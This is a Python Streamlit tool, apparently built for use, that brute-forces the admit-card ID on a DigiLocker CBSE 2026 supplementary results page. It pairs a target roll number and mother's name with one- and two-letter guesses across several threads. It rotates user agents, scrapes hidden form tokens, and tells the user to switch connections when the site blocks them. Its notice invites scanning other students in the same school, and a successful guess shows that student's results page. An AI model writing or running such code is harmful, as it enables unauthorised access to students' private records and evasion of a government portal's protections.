import streamlit as st
import requests
from bs4 import BeautifulSoup
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor

st.set_page_config(page_title="DigiLocker CBSE Engine", page_icon="📝")

st.title("DigiLocker 2026 Supplementary ID Finder")
st.caption("Made by Legionnaire")

st.divider()

# --- Disclaimer ---
st.info("Notice: School Code and Admit Card Suffix need not be changed if you are scanning for students in your same school/center block.")

# --- Main Page Inputs (Mobile First Layout) ---
st.subheader("Target Parameters")
col1, col2 = st.columns(2)
with col1:
    roll_no = st.text_input("Roll Number", value="18602421")
    school_code = st.text_input("School Number", value="45498")
with col2:
    mothers_name = st.text_input("Mother's Name (as per admit card)", value="").strip()
    fixed_suffix = st.text_input("Admit Card Suffix", value="4510")

st.subheader("Execution Settings")
col3, col4 = st.columns(2)
with col3:
    threads = st.slider("Threads (Concurrency):", 1, 5, 3)
with col4:
    start_combo = st.text_input("Start From:", value="A").upper()

# Target DigiLocker Portal Endpoints
base_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.html"
default_post_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.asp"

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
]

def check_id_sync(combo):
    admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(UA_POOL),
        'Referer': base_url,
        'Origin': 'https://results.digilocker.gov.in',
        'Connection': 'close'
    })
    
    try:
        r_init = session.get(base_url, timeout=7)
        soup = BeautifulSoup(r_init.text, 'html.parser')
        
        # Dynamically grab the form action if specified
        form_tag = soup.find('form')
        target_post = default_post_url
        if form_tag and form_tag.get('action'):
            act = form_tag.get('action')
            if act.startswith('http'):
                target_post = act
            else:
                target_post = f"https://results.digilocker.gov.in/{act.lstrip('/')}"

        # Standard field mapping matching the DigiLocker page inputs
        payload = {
            'regno': roll_no,
            'sch': school_code,
            'admid': admit_id,
            'mname': mothers_name,
            'terms': 'on',
            'B2': 'Submit'
        }
        
        # Include any hidden inputs / tokens present in the page
        for h in soup.find_all('input', type='hidden'):
            if h.get('name'):
                payload[h.get('name')] = h.get('value', '')

        time.sleep(random.uniform(0.1, 0.2))
        response = session.post(target_post, data=payload, timeout=7)
        
        if ("Roll No" in response.text or "Candidate Name" in response.text or "Total Marks" in response.text) and "Invalid" not in response.text:
            return "SUCCESS", (admit_id, response.text)
        if "Access Denied" in response.text or response.status_code == 403:
            return "BLOCKED", combo
    except:
        pass
    return "FAIL", combo

def run_scan():
    if not mothers_name:
        st.warning("Please enter Mother's Name before starting the scan.")
        return

    vowels = ['A', 'E', 'I', 'O', 'U']
    chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
        
    combos_1 = ["".join(c) for c in itertools.product(chars, repeat=1)]
    combos_2 = ["".join(c) for c in itertools.product(chars, repeat=2)]
    
    all_combos = combos_1 + combos_2
    
    try:
        start_idx = all_combos.index(start_combo)
        search_space = all_combos[start_idx:]
    except ValueError:
        search_space = all_combos

    progress_bar = st.progress(0)
    status_text = st.empty()
    found = False

    st.info(f"Scan active: Cycling through {len(search_space)} integrated combinations.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {executor.submit(check_id_sync, combo): combo for combo in search_space}
        
        for i, future in enumerate(future_to_combo):
            try:
                res_type, data = future.result()
            except:
                continue
            
            done = i + 1
            progress_bar.progress(min(done / len(search_space), 1.0))
            
            display_id = data[0] if res_type == "SUCCESS" else data
            status_text.write(f"Testing: '{display_id}' | Progress: {done}/{len(search_space)}")

            if res_type == "SUCCESS":
                admit_id, html = data
                st.success(f"Match found: {admit_id}")
                st.components.v1.html(html, height=800, scrolling=True)
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            if res_type == "BLOCKED":
                st.error(f"IP limited at ID '{data}'. Change connection and resume.")
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if not found:
        st.warning("Scan complete. No matching ID found.")

if st.button("Start Scan"):
    run_scan()
